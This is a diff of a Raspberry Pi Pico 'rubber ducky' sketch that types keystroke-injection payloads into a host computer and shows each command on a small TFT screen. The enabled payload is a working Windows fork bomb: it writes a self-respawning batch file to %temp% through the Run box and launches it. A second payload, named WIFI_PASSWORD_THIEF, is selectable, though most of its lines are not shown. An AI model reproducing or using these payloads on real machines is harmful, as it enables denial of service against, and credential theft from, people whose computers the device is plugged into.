@@ -6,12 +6,28 @@
 // intended for use with a rpi pico, but any microcontroller should work 
 // (except attiny boards, they need a special keyboard library)
 
+// includes
 #include <Keyboard.h>
+#include <Adafruit_GFX.h>    // Core graphics library
+#include <Adafruit_ST7735.h> // Hardware-specific library for ST7735
+#include <SPI.h>
 
+// pin definitions
+// hardware pins:
+// MISO - GP17
+// SCK - GP18
+// MOSI - GP19
+#define TFT_CS 10
+#define TFT_RST 9
+#define TFT_DC 8
+#define SD_CS 7
 #define LED_PIN 25
+
+// software definitions
 #define DELAY 10 // this is a very small delay added to select times where the keyboard timing is too fast for host to handle
-#define BEGIN_FLASH_LOOPS 5 // this and BEGIN_FLASH_DELAY are used to wait for the keyboard to work at the begining
-#define BEGIN_FLASH_DELAY 500
+
+#define SCREEN_ROTATION 2
+
 #define KEY_MENU          0xED
 #define KEY_PAUSE         0xD0
 #define KEY_NUMLOCK       0xDB
@@ -20,24 +36,44 @@
 #define KEY_SPACE         0xB4
 #define KEY_BACKSPACE     0xB2
 
+Adafruit_ST7735 tft = Adafruit_ST7735( TFT_CS, TFT_DC, TFT_RST );
+
 void setup() {
     // init led pin
     pinMode( LED_PIN, OUTPUT );
 
+    delay( 100 );
+
+    // init tft screen
+    tft.initR( INITR_BLACKTAB );
+    tft.setRotation( SCREEN_ROTATION );
+    tft.fillScreen( ST77XX_BLACK ); // clear screen
+
     // Initialize control over keyboard
     Keyboard.begin();
 
-    // its important to wait a bit before executing commands,
-    // since if the script runs too early the keyboard doesnt work     
-    for( int i = 0; i < BEGIN_FLASH_LOOPS; i ++ )
-    {
-        digitalWrite( LED_PIN, HIGH ); 
-        delay( BEGIN_FLASH_DELAY );
-        digitalWrite( LED_PIN, LOW ); 
-        delay( BEGIN_FLASH_DELAY );
-    }
-
     // Arducky payload (set "" as last value!)
+    #define MEOW_FORKBOMB
+    //#define WIFI_PASSWORD_THIEF
+    //#define DELAY_SCROLL_TEST
+
+    #ifdef MEOW_FORKBOMB
+    String payload[] = {
+        "GUI r",
+        "DELAY 500",
+        "STRING cmd",
+        "ENTER",
+        "DELAY 1500",
+        "STRING ( echo @echo off && echo :meow && echo echo meow! :3 && echo start %temp%/meow.bat && echo goto meow ) > %temp%/meow.bat",
+        "ENTER",
+        "DELAY 500",
+        "STRING %temp%/meow.bat",
+        "ENTER",
+        ""
+    };
+    #endif
+
+    #ifdef WIFI_PASSWORD_THIEF
     String payload[] = {
         "GUI r",
         "DELAY 500",
@@ -59,23 +95,91 @@ void setup() {
         "ENTER",
         ""
     };
+    #endif
 
-    // Process payload
-    String line = "";
-    for( int i = 0; payload[ i ] != ""; i++ ) // For each line in buffer
-    {
-        delay( DELAY ); // the pico is so fast that this is the only way itll work
-        line = payload[ i ];  // Get line from payload
-        processLine( line );  // Process script line by reading command and payload
-        Keyboard.releaseAll();
-    }
+    #ifdef DELAY_SCROLL_TEST
+    String payload[] = {
+        "DELAY 100                                 ;",
+        "DELAY 200",
+        "DELAY 300",
+        "DELAY 400",
+        "DELAY 500",
+        "DELAY 600",
+        "DELAY 700",
+        "DELAY 800",
+        "DELAY 900",
+        "DELAY 1000",
+        "DELAY 1100",
+        "DELAY 1200",
+        "DELAY 1300",
+        "DELAY 1400",
+        "DELAY 1500",
+        "DELAY 1600",
+        "DELAY 1700",
+        "DELAY 1800                                 ;",
+        "DELAY 1900",
+        "DELAY 2000",
+        "DELAY 2100                                 ;",
+        "DELAY 2200",
+        "DELAY 2300",
+        "DELAY 2400",
+        "DELAY 2500",
+        ""
+    };
+    #endif
+
+    delay( 3000 );
+
+    executePayload( payload );
 
     // End control over keyboard
     Keyboard.end();
-
-    // turn on led when program finishes - You can unplug now
-    digitalWrite( LED_PIN, HIGH ); 
 }
+
+// takes an array of duckyscript commands as strings
+// prints commands to tft as they are executed
+void executePayload( String payload[] )
+{
+    // prepare tft for prining payload text
+    tft.setTextColor( ST77XX_WHITE );
+    tft.setTextWrap( true );
+
+    // execute payload
+    String line = "";
+    int lineoffset = 0; // line offset caused by text wrapping/overflow
+    String display = ""; // display string buffer
+    for( int i = 0; payload[ i ] != ""; i ++ ) // For each line in buffer
+    {
+        digitalWrite( LED_PIN, !digitalRead( LED_PIN ) ); // switch led state
+        tft.fillScreen( ST77XX_BLACK ); // clear screen
+        
+        // manage display buffer
+        display += payload[ i ] + "\n";
+        lineoffset += 1 + floor( ( payload[ i ].length() ) / 21 );
+        while( lineoffset >= 21 )
+        {
+            display = display.substring( min( display.indexOf( "\n" ), 20 ) + 1 );
+            lineoffset --;
+        }
+        
+        // display display buffer
+        tft.setCursor( 0, 0 );
+        tft.print( display );
+        
+        line = payload[ i ];  // Get line from payload
+        processLine( line );  // Process script line by reading command and payload
+        //Keyboard.releaseAll(); // release all keys
+    }
+
+    // display that script is done
+    delay( DELAY ); // delay a little bit for screen
+    display += "done!";
+    display = display.substring( min( display.indexOf( "\n" ), 20 ) + 1 ); // get rid of first line
+    tft.fillScreen( ST77XX_BLACK ); // clear screen
+    tft.setCursor( 0, 0 );
+    tft.print( display );
+}
+
 
 // adapted from
 // https://github.com/Creased/arducky/blob/master/arducky_femto.ino
